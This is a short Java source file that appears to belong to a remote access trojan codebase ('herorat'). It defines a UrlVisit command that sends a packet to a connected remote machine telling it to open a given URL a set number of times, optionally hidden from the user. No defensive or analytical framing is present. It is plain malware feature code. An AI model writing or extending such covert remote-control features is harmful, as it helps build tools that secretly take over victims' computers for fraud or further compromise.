package net.herorat.features.urlvisit;

//import javax.swing.JOptionPane;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet12Urlvisit;


public class UrlVisit
{
	public static void send(Server server, String url, int times, boolean hidden)
	{
		Packet p = new Packet12Urlvisit(server.outputstream, new String[] { url, String.valueOf(times), hidden ? "true" : "false" });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
	}
}